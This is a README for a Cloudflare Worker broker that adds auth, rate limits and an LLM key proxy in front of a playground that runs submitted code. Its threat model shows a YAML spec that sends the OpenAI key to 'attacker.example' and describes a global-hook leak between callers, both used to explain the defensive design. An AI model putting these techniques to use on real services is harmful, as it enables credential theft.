# @heddle/broker

The Cloudflare Worker in front of the playground engine. It is the only public
face of a service that executes code its callers wrote.

`@heddle/server` is deliberate about having no authentication — its README says
so plainly. This is where that is meant to be terminated.

## Shape

```
heddle.run/playground        broker (this)              HeddleEngine container
static export, Pages   ──►   auth, rate limit,    ──►   heddle-server
                             CORS, SSE passthrough      --allow-request-code
                                   │
                                   └── /llm/*  ──►  api.openai.com
                                       injects the real key
```

## Why a container per run

heddle imports submitted plugins into its own process with a dynamic
`import()`, and compiling a flow calls the plugin's `createExecutor`. Submitted
code therefore runs *as* the engine, in the engine's process.

A shared engine leaks between callers, and not subtly. Three ordinary requests
are enough: one plants a hook on a global, an unrelated visitor runs, and the
first returns to read what the hook captured. No escape and no exploit — just
`globalThis` outliving a request.

So instances are addressed by run id. Each run gets an engine that has never
executed anyone else's code, and the broker destroys it when the response
stream closes. `sleepAfter` is the backstop for the paths that miss.

The cost is a cold start per run — about 2.5s end to end when measured
locally. If that becomes too slow, a warm pool preserves the property; sharing
one process does not.

## Why the container holds no model key

`createProvider` in `@heddle/core` reads both the LLM base URL and its
credential from the **submitted spec**:

```yaml
llm_config:
  component_type: OpenAiConfig
  url: https://attacker.example
  api_key: $OPENAI_API_KEY
```

That is an ordinary flow. No plugin, no tool. Any credential in the container's
environment leaves with the first request a caller writes.

Two things answer it:

- **Egress is denied.** `enableInternet = false`, with `allowedHosts` naming
  only the broker. The request above does not leave the container.
- **The credential is per run.** The container gets a signed token that expires
  in minutes and is only accepted by `/llm/*`, which exchanges it for the real
  key and counts the calls. Reading it out of `process.env` is easy and gains
  nothing.

The key lives in the worker's secrets and nowhere else.

## Configuration

`vars` in `wrangler.jsonc`:

| Var | Meaning |
|---|---|
| `ALLOWED_ORIGINS` | Comma-separated browser origins. Matched exactly. |
| `PROXY_HOST` | The broker's hostname — the one host a container may reach. |
| `PROXY_URL` | Absolute URL of `/llm/v1`, handed to the engine as `OPENAI_BASE_URL`. |
| `UPSTREAM_BASE` | What `/llm/*` forwards to. |
| `RUNS_PER_MINUTE` | Runs per caller IP. |
| `MODEL_CALLS_PER_RUN` | Model calls one run may make. |

Secrets, set once with `wrangler secret put`:

| Secret | Meaning |
|---|---|
| `RUN_TOKEN_SECRET` | HMAC key for run tokens. |
| `OPENAI_API_KEY` | The real model credential. |
| `TURNSTILE_SECRET` | Optional. When set, requests must carry a solved token. |

**`PROXY_HOST` and `PROXY_URL` must match the deployed worker's hostname.** The
container's allow list is built from `PROXY_HOST`, so if it is wrong the engine
cannot reach the model proxy and every agent flow fails. They are guesses until
the first deploy tells you the real one.

## Deploying

Requires Docker locally — wrangler builds the engine image before uploading.

```bash
pnpm install
npx wrangler login

npx wrangler secret put RUN_TOKEN_SECRET
npx wrangler secret put OPENAI_API_KEY

npx wrangler deploy
```

Then set `PROXY_HOST` / `PROXY_URL` to the real hostname, redeploy, and set the
`HEDDLE_API_URL` repository variable so the Pages build points the playground
at it.

CI does the same on pushes to `main` that touch the engine or the broker — see
`.github/workflows/deploy-playground.yml`. It needs `CLOUDFLARE_API_TOKEN` and
`CLOUDFLARE_ACCOUNT_ID` as repository secrets.

## Local development

```bash
npx wrangler dev
```

Reads `.dev.vars` for secrets (gitignored; placeholders are fine for anything
that does not call a model). Containers run under the local Docker daemon, so
runs work end to end apart from the model proxy.

## What this does not do

- **No accounting per user.** The limits are per IP and per run.
- **No protection against a container escape.** A namespace bug is a host
  compromise. Run the account with nothing else valuable in it.
- **Turnstile is off unless configured**, and the playground page does not yet
  render the widget. Until both are done, the rate limiter is the only thing
  between the internet and the engine.
